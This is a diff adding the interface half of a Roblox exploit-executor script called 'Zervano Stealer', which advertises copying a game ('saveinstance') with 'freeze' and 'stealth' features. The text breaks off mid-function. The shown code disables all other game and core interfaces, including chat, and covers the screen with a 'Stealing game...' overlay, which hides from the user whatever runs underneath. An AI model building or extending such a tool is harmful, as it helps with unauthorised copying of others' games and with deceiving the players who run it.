@@ -1,0 +1,1041 @@
+-- Zervano Stealer v.01 - GUI Loader (Solara compatible)
+
+repeat task.wait() until game:IsLoaded()
+
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+repeat task.wait() until player and player.Character
+
+-- ============================================================
+-- Root GUI (Solara: PlayerGui, no gethui)
+-- ============================================================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ZervanoStealer_" .. tostring(math.random(1, 1e9))
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder = 2147483647
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- ============================================================
+-- Colors
+-- ============================================================
+local COLORS = {
+    bg          = Color3.fromRGB(12, 12, 16),
+    bgAlt       = Color3.fromRGB(20, 20, 26),
+    bgDeep      = Color3.fromRGB(8, 8, 12),
+    bgCard      = Color3.fromRGB(18, 18, 24),
+    border      = Color3.fromRGB(52, 52, 66),
+    borderSoft  = Color3.fromRGB(36, 36, 46),
+    accent1     = Color3.fromRGB(140, 70, 255),   -- violet
+    accent2     = Color3.fromRGB(0, 200, 255),    -- cyan
+    accent3     = Color3.fromRGB(255, 70, 180),   -- pink
+    text        = Color3.fromRGB(248, 248, 252),
+    textDim     = Color3.fromRGB(155, 155, 170),
+    textMuted   = Color3.fromRGB(95, 95, 110),
+    ok          = Color3.fromRGB(80, 220, 120),
+    warn        = Color3.fromRGB(255, 190, 80),
+    err         = Color3.fromRGB(255, 90, 90),
+    btnIdle     = Color3.fromRGB(120, 60, 255),
+    btnHover    = Color3.fromRGB(150, 90, 255),
+    btnBusy     = Color3.fromRGB(55, 55, 70),
+    btnDone     = Color3.fromRGB(60, 180, 100),
+    closeIdle   = Color3.fromRGB(45, 45, 55),
+    closeHover  = Color3.fromRGB(240, 70, 70),
+}
+
+local FONT_BOLD = Enum.Font.GothamBold
+local FONT_MED  = Enum.Font.GothamMedium
+local FONT_REG  = Enum.Font.Gotham
+
+-- ============================================================
+-- Main frame
+-- ============================================================
+local Frame = Instance.new("Frame")
+Frame.Name = "Main"
+Frame.Size = UDim2.new(0, 320, 0, 230)
+Frame.Position = UDim2.new(0.5, -160, 0.5, -115)
+Frame.BackgroundColor3 = COLORS.bg
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.ClipsDescendants = false
+Frame.Parent = ScreenGui
+
+local frameCorner = Instance.new("UICorner")
+frameCorner.CornerRadius = UDim.new(0, 14)
+frameCorner.Parent = Frame
+
+-- Animated gradient border
+local borderStroke = Instance.new("UIStroke")
+borderStroke.Thickness = 1.5
+borderStroke.Color = COLORS.accent1
+borderStroke.Transparency = 0.15
+borderStroke.Parent = Frame
+
+local borderGradient = Instance.new("UIGradient")
+borderGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0, COLORS.accent1),
+    ColorSequenceKeypoint.new(0.5, COLORS.accent2),
+    ColorSequenceKeypoint.new(1.0, COLORS.accent3),
+})
+borderGradient.Parent = borderStroke
+
+local borderOffset = 0
+local borderConn = RunService.RenderStepped:Connect(function(dt)
+    borderOffset = (borderOffset + dt * 0.12) % 1
+    borderGradient.Offset = Vector2.new(borderOffset, 0)
+end)
+
+-- Soft shadow
+local shadow = Instance.new("ImageLabel")
+shadow.Name = "Shadow"
+shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+shadow.Position = UDim2.new(0.5, 0, 0.5, 10)
+shadow.Size = UDim2.new(1, 80, 1, 80)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxassetid://6014261993"
+shadow.ImageColor3 = Color3.new(0, 0, 0)
+shadow.ImageTransparency = 0.35
+shadow.ScaleType = Enum.ScaleType.Slice
+shadow.SliceCenter = Rect.new(49, 49, 450, 450)
+shadow.ZIndex = -1
+shadow.Parent = Frame
+
+-- Ambient top glow
+local topGlow = Instance.new("Frame")
+topGlow.Size = UDim2.new(1, -2, 0, 90)
+topGlow.Position = UDim2.new(0, 1, 0, 1)
+topGlow.BackgroundColor3 = COLORS.accent1
+topGlow.BackgroundTransparency = 0.93
+topGlow.BorderSizePixel = 0
+topGlow.ZIndex = 0
+topGlow.Parent = Frame
+
+local topGlowCorner = Instance.new("UICorner")
+topGlowCorner.CornerRadius = UDim.new(0, 14)
+topGlowCorner.Parent = topGlow
+
+local topGlowGradient = Instance.new("UIGradient")
+topGlowGradient.Rotation = 90
+topGlowGradient.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 0),
+    NumberSequenceKeypoint.new(1, 1),
+})
+topGlowGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, COLORS.accent1),
+    ColorSequenceKeypoint.new(1, COLORS.accent2),
+})
+topGlowGradient.Parent = topGlow
+
+-- Bottom ambient glow
+local bottomGlow = Instance.new("Frame")
+bottomGlow.Size = UDim2.new(1, -2, 0, 60)
+bottomGlow.Position = UDim2.new(0, 1, 1, -61)
+bottomGlow.BackgroundColor3 = COLORS.accent3
+bottomGlow.BackgroundTransparency = 0.96
+bottomGlow.BorderSizePixel = 0
+bottomGlow.ZIndex = 0
+bottomGlow.Parent = Frame
+
+local bottomGlowCorner = Instance.new("UICorner")
+bottomGlowCorner.CornerRadius = UDim.new(0, 14)
+bottomGlowCorner.Parent = bottomGlow
+
+local bottomGlowGradient = Instance.new("UIGradient")
+bottomGlowGradient.Rotation = 270
+bottomGlowGradient.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 0),
+    NumberSequenceKeypoint.new(1, 1),
+})
+bottomGlowGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, COLORS.accent3),
+    ColorSequenceKeypoint.new(1, COLORS.accent1),
+})
+bottomGlowGradient.Parent = bottomGlow
+
+-- ============================================================
+-- Title bar
+-- ============================================================
+local TitleBar = Instance.new("Frame")
+TitleBar.Name = "TitleBar"
+TitleBar.Size = UDim2.new(1, 0, 0, 44)
+TitleBar.BackgroundColor3 = COLORS.bgAlt
+TitleBar.BackgroundTransparency = 0.1
+TitleBar.BorderSizePixel = 0
+TitleBar.ZIndex = 2
+TitleBar.Parent = Frame
+
+local titleBarCorner = Instance.new("UICorner")
+titleBarCorner.CornerRadius = UDim.new(0, 14)
+titleBarCorner.Parent = TitleBar
+
+local titleBarFix = Instance.new("Frame")
+titleBarFix.Size = UDim2.new(1, 0, 0, 14)
+titleBarFix.Position = UDim2.new(0, 0, 1, -14)
+titleBarFix.BackgroundColor3 = COLORS.bgAlt
+titleBarFix.BackgroundTransparency = 0.1
+titleBarFix.BorderSizePixel = 0
+titleBarFix.ZIndex = 2
+titleBarFix.Parent = TitleBar
+
+local accent = Instance.new("Frame")
+accent.Size = UDim2.new(1, 0, 0, 1)
+accent.Position = UDim2.new(0, 0, 1, -1)
+accent.BorderSizePixel = 0
+accent.ZIndex = 3
+accent.Parent = TitleBar
+
+local accentGradient = Instance.new("UIGradient")
+accentGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0, COLORS.accent1),
+    ColorSequenceKeypoint.new(0.5, COLORS.accent2),
+    ColorSequenceKeypoint.new(1.0, COLORS.accent3),
+})
+accentGradient.Parent = accent
+
+-- Animated logo
+local logoHolder = Instance.new("Frame")
+logoHolder.Size = UDim2.new(0, 20, 0, 20)
+logoHolder.Position = UDim2.new(0, 14, 0.5, -10)
+logoHolder.BackgroundTransparency = 1
+logoHolder.ZIndex = 3
+logoHolder.Parent = TitleBar
+
+local logoOuter = Instance.new("Frame")
+logoOuter.Size = UDim2.new(1, 0, 1, 0)
+logoOuter.BackgroundColor3 = COLORS.accent1
+logoOuter.BackgroundTransparency = 0.75
+logoOuter.BorderSizePixel = 0
+logoOuter.ZIndex = 3
+logoOuter.Parent = logoHolder
+
+local logoOuterCorner = Instance.new("UICorner")
+logoOuterCorner.CornerRadius = UDim.new(1, 0)
+logoOuterCorner.Parent = logoOuter
+
+local logoInner = Instance.new("Frame")
+logoInner.AnchorPoint = Vector2.new(0.5, 0.5)
+logoInner.Position = UDim2.new(0.5, 0, 0.5, 0)
+logoInner.Size = UDim2.new(0, 12, 0, 12)
+logoInner.BackgroundColor3 = COLORS.accent1
+logoInner.BorderSizePixel = 0
+logoInner.ZIndex = 4
+logoInner.Parent = logoHolder
+
+local logoInnerCorner = Instance.new("UICorner")
+logoInnerCorner.CornerRadius = UDim.new(1, 0)
+logoInnerCorner.Parent = logoInner
+
+local logoGradient = Instance.new("UIGradient")
+logoGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, COLORS.accent1),
+    ColorSequenceKeypoint.new(1, COLORS.accent2),
+})
+logoGradient.Parent = logoInner
+
+-- Pulse animation
+task.spawn(function()
+    while ScreenGui.Parent do
+        TweenService:Create(logoOuter, TweenInfo.new(1.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Size = UDim2.new(1.5, 0, 1.5, 0),
+            Position = UDim2.new(-0.25, 0, -0.25, 0),
+            BackgroundTransparency = 0.95,
+        }):Play()
+        task.wait(1.3)
+        TweenService:Create(logoOuter, TweenInfo.new(0.01), {
+            Size = UDim2.new(1, 0, 1, 0),
+            Position = UDim2.new(0, 0, 0, 0),
+            BackgroundTransparency = 0.75,
+        }):Play()
+        task.wait(0.05)
+    end
+end)
+
+-- Title text
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -130, 1, 0)
+Title.Position = UDim2.new(0, 42, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Zervano Stealer"
+Title.TextColor3 = COLORS.text
+Title.Font = FONT_BOLD
+Title.TextSize = 16
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.ZIndex = 3
+Title.Parent = TitleBar
+
+-- Version badge
+local VersionBadge = Instance.new("TextLabel")
+VersionBadge.AnchorPoint = Vector2.new(0, 0.5)
+VersionBadge.Position = UDim2.new(0, 168, 0.5, 1)
+VersionBadge.Size = UDim2.new(0, 46, 0, 18)
+VersionBadge.BackgroundColor3 = COLORS.accent1
+VersionBadge.BackgroundTransparency = 0.82
+VersionBadge.BorderSizePixel = 0
+VersionBadge.Text = "v.01"
+VersionBadge.TextColor3 = COLORS.accent2
+VersionBadge.Font = FONT_BOLD
+VersionBadge.TextSize = 10
+VersionBadge.ZIndex = 4
+VersionBadge.Parent = TitleBar
+
+local versionCorner = Instance.new("UICorner")
+versionCorner.CornerRadius = UDim.new(1, 0)
+versionCorner.Parent = VersionBadge
+
+local versionStroke = Instance.new("UIStroke")
+versionStroke.Color = COLORS.accent2
+versionStroke.Thickness = 1
+versionStroke.Transparency = 0.5
+versionStroke.Parent = VersionBadge
+
+-- Close button
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 26, 0, 26)
+CloseBtn.Position = UDim2.new(1, -34, 0.5, -13)
+CloseBtn.BackgroundColor3 = COLORS.closeIdle
+CloseBtn.BorderSizePixel = 0
+CloseBtn.Text = "×"
+CloseBtn.TextColor3 = COLORS.text
+CloseBtn.Font = FONT_BOLD
+CloseBtn.TextSize = 18
+CloseBtn.AutoButtonColor = false
+CloseBtn.ZIndex = 4
+CloseBtn.Parent = TitleBar
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 8)
+closeCorner.Parent = CloseBtn
+
+local closeStroke = Instance.new("UIStroke")
+closeStroke.Color = COLORS.border
+closeStroke.Thickness = 1
+closeStroke.Transparency = 0.5
+closeStroke.Parent = CloseBtn
+
+CloseBtn.MouseEnter:Connect(function()
+    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {
+        BackgroundColor3 = COLORS.closeHover,
+    }):Play()
+    TweenService:Create(closeStroke, TweenInfo.new(0.15), {
+        Transparency = 0,
+    }):Play()
+end)
+
+CloseBtn.MouseLeave:Connect(function()
+    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {
+        BackgroundColor3 = COLORS.closeIdle,
+    }):Play()
+    TweenService:Create(closeStroke, TweenInfo.new(0.15), {
+        Transparency = 0.5,
+    }):Play()
+end)
+
+CloseBtn.MouseButton1Click:Connect(function()
+    if borderConn then borderConn:Disconnect() end
+    ScreenGui:Destroy()
+end)
+
+-- ============================================================
+-- Status card
+-- ============================================================
+local StatusCard = Instance.new("Frame")
+StatusCard.Name = "StatusCard"
+StatusCard.Size = UDim2.new(1, -28, 0, 72)
+StatusCard.Position = UDim2.new(0, 14, 0, 58)
+StatusCard.BackgroundColor3 = COLORS.bgCard
+StatusCard.BorderSizePixel = 0
+StatusCard.ZIndex = 1
+StatusCard.Parent = Frame
+
+local statusCardCorner = Instance.new("UICorner")
+statusCardCorner.CornerRadius = UDim.new(0, 10)
+statusCardCorner.Parent = StatusCard
+
+local statusCardStroke = Instance.new("UIStroke")
+statusCardStroke.Color = COLORS.borderSoft
+statusCardStroke.Thickness = 1
+statusCardStroke.Parent = StatusCard
+
+local statusDotHolder = Instance.new("Frame")
+statusDotHolder.Size = UDim2.new(0, 16, 0, 16)
+statusDotHolder.Position = UDim2.new(0, 14, 0, 14)
+statusDotHolder.BackgroundTransparency = 1
+statusDotHolder.ZIndex = 2
+statusDotHolder.Parent = StatusCard
+
+local statusDot = Instance.new("Frame")
+statusDot.AnchorPoint = Vector2.new(0.5, 0.5)
+statusDot.Position = UDim2.new(0.5, 0, 0.5, 0)
+statusDot.Size = UDim2.new(0, 9, 0, 9)
+statusDot.BackgroundColor3 = COLORS.textMuted
+statusDot.BorderSizePixel = 0
+statusDot.ZIndex = 2
+statusDot.Parent = statusDotHolder
+
+local dotCorner = Instance.new("UICorner")
+dotCorner.CornerRadius = UDim.new(1, 0)
+dotCorner.Parent = statusDot
+
+-- Halo around status dot
+local statusHalo = Instance.new("Frame")
+statusHalo.AnchorPoint = Vector2.new(0.5, 0.5)
+statusHalo.Position = UDim2.new(0.5, 0, 0.5, 0)
+statusHalo.Size = UDim2.new(1.6, 0, 1.6, 0)
+statusHalo.BackgroundColor3 = COLORS.textMuted
+statusHalo.BackgroundTransparency = 0.75
+statusHalo.BorderSizePixel = 0
+statusHalo.ZIndex = 1
+statusHalo.Parent = statusDotHolder
+
+local statusHaloCorner = Instance.new("UICorner")
+statusHaloCorner.CornerRadius = UDim.new(1, 0)
+statusHaloCorner.Parent = statusHalo
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, -54, 0, 12)
+statusLabel.Position = UDim2.new(0, 38, 0, 12)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "STATUS"
+statusLabel.TextColor3 = COLORS.textMuted
+statusLabel.Font = FONT_BOLD
+statusLabel.TextSize = 9
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.ZIndex = 2
+statusLabel.Parent = StatusCard
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, -50, 0, 42)
+Status.Position = UDim2.new(0, 38, 0, 26)
+Status.BackgroundTransparency = 1
+Status.Text = "Ready to start."
+Status.TextColor3 = COLORS.textDim
+Status.Font = FONT_REG
+Status.TextSize = 12
+Status.TextWrapped = true
+Status.TextXAlignment = Enum.TextXAlignment.Left
+Status.TextYAlignment = Enum.TextYAlignment.Top
+Status.ZIndex = 2
+Status.Parent = StatusCard
+
+-- ============================================================
+-- Info / feature chips
+-- ============================================================
+local ChipRow = Instance.new("Frame")
+ChipRow.Size = UDim2.new(1, -28, 0, 20)
+ChipRow.Position = UDim2.new(0, 14, 0, 136)
+ChipRow.BackgroundTransparency = 1
+ChipRow.ZIndex = 1
+ChipRow.Parent = Frame
+
+local chipLayout = Instance.new("UIListLayout")
+chipLayout.FillDirection = Enum.FillDirection.Horizontal
+chipLayout.Padding = UDim.new(0, 6)
+chipLayout.SortOrder = Enum.SortOrder.LayoutOrder
+chipLayout.Parent = ChipRow
+
+local function makeChip(text, color)
+    local chip = Instance.new("TextLabel")
+    chip.Size = UDim2.new(0, 0, 1, 0)
+    chip.AutomaticSize = Enum.AutomaticSize.X
+    chip.BackgroundColor3 = color
+    chip.BackgroundTransparency = 0.88
+    chip.BorderSizePixel = 0
+    chip.Text = "  " .. text .. "  "
+    chip.TextColor3 = color
+    chip.Font = FONT_BOLD
+    chip.TextSize = 9
+    chip.ZIndex = 2
+    chip.Parent = ChipRow
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(1, 0)
+    c.Parent = chip
+    local s = Instance.new("UIStroke")
+    s.Color = color
+    s.Thickness = 1
+    s.Transparency = 0.6
+    s.Parent = chip
+    return chip
+end
+
+makeChip("SAVEINSTANCE", COLORS.accent2)
+makeChip("FREEZE", COLORS.accent3)
+makeChip("STEALTH", COLORS.accent1)
+
+-- ============================================================
+-- Execute button
+-- ============================================================
+local Button = Instance.new("TextButton")
+Button.Size = UDim2.new(1, -28, 0, 46)
+Button.Position = UDim2.new(0, 14, 1, -60)
+Button.BackgroundColor3 = COLORS.btnIdle
+Button.BorderSizePixel = 0
+Button.Text = "EXECUTE"
+Button.TextColor3 = COLORS.text
+Button.Font = FONT_BOLD
+Button.TextSize = 14
+Button.AutoButtonColor = false
+Button.ZIndex = 2
+Button.Parent = Frame
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 10)
+btnCorner.Parent = Button
+
+local btnGradient = Instance.new("UIGradient")
+btnGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0, COLORS.accent1),
+    ColorSequenceKeypoint.new(0.5, COLORS.accent2),
+    ColorSequenceKeypoint.new(1.0, COLORS.accent1),
+})
+btnGradient.Parent = Button
+
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = COLORS.accent2
+btnStroke.Thickness = 1
+btnStroke.Transparency = 0.5
+btnStroke.Parent = Button
+
+-- Shine sweep on the button
+local shine = Instance.new("Frame")
+shine.Size = UDim2.new(0, 60, 1, 0)
+shine.Position = UDim2.new(0, -80, 0, 0)
+shine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+shine.BackgroundTransparency = 0.85
+shine.BorderSizePixel = 0
+shine.ZIndex = 3
+shine.Parent = Button
+
+local shineGradient = Instance.new("UIGradient")
+shineGradient.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0, 1),
+    NumberSequenceKeypoint.new(0.5, 0.3),
+    NumberSequenceKeypoint.new(1, 1),
+})
+shineGradient.Parent = shine
+
+local shineCorner = Instance.new("UICorner")
+shineCorner.CornerRadius = UDim.new(0, 10)
+shineCorner.Parent = shine
+
+task.spawn(function()
+    while ScreenGui.Parent do
+        shine.Position = UDim2.new(0, -80, 0, 0)
+        TweenService:Create(shine, TweenInfo.new(1.6, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
+            Position = UDim2.new(1, 20, 0, 0),
+        }):Play()
+        task.wait(3)
+    end
+end)
+
+local function tweenButton(color)
+    TweenService:Create(Button, TweenInfo.new(0.15), {
+        BackgroundColor3 = color,
+    }):Play()
+end
+
+Button.MouseEnter:Connect(function()
+    if not Button:GetAttribute("Busy") then
+        tweenButton(COLORS.btnHover)
+        TweenService:Create(btnStroke, TweenInfo.new(0.2), {
+            Transparency = 0.1,
+            Thickness = 1.5,
+        }):Play()
+    end
+end)
+
+Button.MouseLeave:Connect(function()
+    if not Button:GetAttribute("Busy") then
+        tweenButton(COLORS.btnIdle)
+        TweenService:Create(btnStroke, TweenInfo.new(0.2), {
+            Transparency = 0.5,
+            Thickness = 1,
+        }):Play()
+    end
+end)
+
+-- ============================================================
+-- Dragging
+-- ============================================================
+do
+    local dragging = false
+    local dragInput, dragStart, startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        Frame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+
+    local function beginDrag(input)
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+    end
+
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            beginDrag(input)
+        end
+    end)
+
+    TitleBar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+end
+
+-- ============================================================
+-- Hide all other GUIs
+-- ============================================================
+local function hideAllOtherGuis()
+    -- 1) Disable CoreGui UI elements via StarterGui:SetCoreGuiEnabled
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    end)
+    -- Some individual toggles for robustness
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false) end)
+
+    -- 2) Hide every other ScreenGui inside PlayerGui
+    local playerGui = player:FindFirstChildOfClass("PlayerGui")
+    if playerGui then
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui ~= ScreenGui and gui.Enabled then
+                gui.Enabled = false
+            end
+        end
+    end
+
+    -- 3) Try to hide CoreGui ScreenGuis (works if the executor has permission)
+    pcall(function()
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui.Enabled then
+                gui.Enabled = false
+            end
+        end
+    end)
+
+    -- 4) Hide legacy game GUIs (chat, leaderboard, etc.)
+    pcall(function()
+        local pg = player:FindFirstChildOfClass("PlayerGui")
+        if pg then
+            local chat = pg:FindFirstChild("Chat")
+            if chat then chat.Enabled = false end
+        end
+    end)
+end
+
+-- ============================================================
+-- Fullscreen white loading overlay
+-- ============================================================
+local Overlay = Instance.new("Frame")
+Overlay.Name = "LoadOverlay"
+Overlay.Size = UDim2.new(1, 0, 1, 0)
+Overlay.Position = UDim2.new(0, 0, 0, 0)
+Overlay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Overlay.BorderSizePixel = 0
+Overlay.BackgroundTransparency = 1
+Overlay.Visible = false
+Overlay.ZIndex = 5000
+Overlay.Parent = ScreenGui
+
+local OverlayContent = Instance.new("Frame")
+OverlayContent.Name = "Content"
+OverlayContent.AnchorPoint = Vector2.new(0.5, 0.5)
+OverlayContent.Position = UDim2.new(0.5, 0, 0.5, 0)
+OverlayContent.Size = UDim2.new(0, 500, 0, 200)
+OverlayContent.BackgroundTransparency = 1
+OverlayContent.ZIndex = 5001
+OverlayContent.Parent = Overlay
+
+-- Big animated ring around logo
+local RingOuter = Instance.new("Frame")
+RingOuter.AnchorPoint = Vector2.new(0.5, 0.5)
+RingOuter.Position = UDim2.new(0.5, 0, 0, 0)
+RingOuter.Size = UDim2.new(0, 80, 0, 80)
+RingOuter.BackgroundTransparency = 1
+RingOuter.ZIndex = 5002
+RingOuter.Parent = OverlayContent
+
+local ringOuterStroke = Instance.new("UIStroke")
+ringOuterStroke.Color = COLORS.accent1
+ringOuterStroke.Thickness = 2
+ringOuterStroke.Transparency = 0.6
+ringOuterStroke.Parent = RingOuter
+
+local ringOuterCorner = Instance.new("UICorner")
+ringOuterCorner.CornerRadius = UDim.new(1, 0)
+ringOuterCorner.Parent = RingOuter
+
+local ringOuterGradient = Instance.new("UIGradient")
+ringOuterGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0, COLORS.accent1),
+    ColorSequenceKeypoint.new(0.5, COLORS.accent2),
+    ColorSequenceKeypoint.new(1.0, COLORS.accent3),
+})
+ringOuterGradient.Parent = ringOuterStroke
+
+-- Logo mark
+local OverlayLogo = Instance.new("Frame")
+OverlayLogo.AnchorPoint = Vector2.new(0.5, 0.5)
+OverlayLogo.Position = UDim2.new(0.5, 0, 0, 0)
+OverlayLogo.Size = UDim2.new(0, 52, 0, 52)
+OverlayLogo.BackgroundColor3 = COLORS.accent1
+OverlayLogo.BorderSizePixel = 0
+OverlayLogo.ZIndex = 5003
+OverlayLogo.Parent = OverlayContent
+
+local overlayLogoCorner = Instance.new("UICorner")
+overlayLogoCorner.CornerRadius = UDim.new(1, 0)
+overlayLogoCorner.Parent = OverlayLogo
+
+local overlayLogoGradient = Instance.new("UIGradient")
+overlayLogoGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, COLORS.accent1),
+    ColorSequenceKeypoint.new(1, COLORS.accent2),
+})
+overlayLogoGradient.Parent = OverlayLogo
+
+local OverlayLogoInner = Instance.new("Frame")
+OverlayLogoInner.AnchorPoint = Vector2.new(0.5, 0.5)
+OverlayLogoInner.Position = UDim2.new(0.5, 0, 0.5, 0)
+OverlayLogoInner.Size = UDim2.new(0, 20, 0, 20)
+OverlayLogoInner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OverlayLogoInner.BorderSizePixel = 0
+OverlayLogoInner.ZIndex = 5004
+OverlayLogoInner.Parent = OverlayLogo
+
+local overlayLogoInnerCorner = Instance.new("UICorner")
+overlayLogoInnerCorner.CornerRadius = UDim.new(1, 0)
+overlayLogoInnerCorner.Parent = OverlayLogoInner
+
+-- "Stealing game..." text
+local StealText = Instance.new("TextLabel")
+StealText.Name = "StealText"
+StealText.AnchorPoint = Vector2.new(0.5, 0)
+StealText.Position = UDim2.new(0.5, 0, 0, 62)
+StealText.Size = UDim2.new(1, 0, 0, 42)
+StealText.BackgroundTransparency = 1
+StealText.Text = "Stealing game..."
+StealText.TextColor3 = Color3.fromRGB(18, 18, 24)
+StealText.Font = FONT_BOLD
+StealText.TextSize = 32
+StealText.TextTransparency = 1
+StealText.ZIndex = 5002
+StealText.Parent = OverlayContent
+
+-- Subtitle
+local OverlaySub = Instance.new("TextLabel")
+OverlaySub.Name = "Sub"
+OverlaySub.AnchorPoint = Vector2.new(0.5, 0)
+OverlaySub.Position = UDim2.new(0.5, 0, 0, 104)
+OverlaySub.Size = UDim2.new(1, 0, 0, 18)
+OverlaySub.BackgroundTransparency = 1
+OverlaySub.Text = "Zervano Stealer v.01"
+OverlaySub.TextColor3 = Color3.fromRGB(130, 130, 145)
+OverlaySub.Font = FONT_MED
+OverlaySub.TextSize = 13
+OverlaySub.TextTransparency = 1
+OverlaySub.ZIndex = 5002
+OverlaySub.Parent = OverlayContent
+
+-- Progress bar background
+local BarBg = Instance.new("Frame")
+BarBg.Name = "BarBg"
+BarBg.AnchorPoint = Vector2.new(0.5, 0.5)
+BarBg.Position = UDim2.new(0.5, 0, 1, -22)
+BarBg.Size = UDim2.new(0, 440, 0, 9)
+BarBg.BackgroundColor3 = Color3.fromRGB(226, 226, 234)
+BarBg.BorderSizePixel = 0
+BarBg.BackgroundTransparency = 1
+BarBg.ZIndex = 5002
+BarBg.Parent = OverlayContent
+
+local barBgCorner = Instance.new("UICorner")
+barBgCorner.CornerRadius = UDim.new(1, 0)
+barBgCorner.Parent = BarBg
+
+-- Progress bar fill
+local BarFill = Instance.new("Frame")
+BarFill.Name = "BarFill"
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.Position = UDim2.new(0, 0, 0, 0)
+BarFill.BackgroundColor3 = COLORS.accent1
+BarFill.BorderSizePixel = 0
+BarFill.ZIndex = 5003
+BarFill.Parent = BarBg
+
+local barFillCorner = Instance.new("UICorner")
+barFillCorner.CornerRadius = UDim.new(1, 0)
+barFillCorner.Parent = BarFill
+
+local barFillGradient = Instance.new("UIGradient")
+barFillGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.0, COLORS.accent1),
+    ColorSequenceKeypoint.new(0.5, COLORS.accent2),
+    ColorSequenceKeypoint.new(1.0, COLORS.accent3),
+})
+barFillGradient.Parent = BarFill
+
+-- Percentage text
+local PercentText = Instance.new("TextLabel")
+PercentText.Name = "Percent"
+PercentText.AnchorPoint = Vector2.new(0.5, 0)
+PercentText.Position = UDim2.new(0.5, 0, 1, 6)
+PercentText.Size = UDim2.new(1, 0, 0, 22)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "0%"
+PercentText.TextColor3 = Color3.fromRGB(90, 90, 105)
+PercentText.Font = FONT_BOLD
+PercentText.TextSize = 14
+PercentText.TextTransparency = 1
+PercentText.ZIndex = 5002
+PercentText.Parent = OverlayContent
+
+-- Rotating outer ring animation
+task.spawn(function()
+    local angle = 0
+    while ScreenGui.Parent do
+        if Overlay.Visible then
+            angle = (angle + 1.6) % 360
+            ringOuterGradient.Rotation = angle
+            local s = 1 + math.sin(tick() * 2) * 0.06
+            RingOuter.Size = UDim2.new(0, 80 * s, 0, 80 * s)
+        end
+        RunService.Heartbeat:Wait()
+    end
+end)
+
+-- Overlay control helpers
+local function fadeOverlay(visible, duration)
+    duration = duration or 0.35
+    if visible then
+        Overlay.Visible = true
+        Overlay.BackgroundTransparency = 1
+        StealText.TextTransparency = 1
+        OverlaySub.TextTransparency = 1
+        OverlayLogo.BackgroundTransparency = 1
+        OverlayLogoInner.BackgroundTransparency = 1
+        ringOuterStroke.Transparency = 1
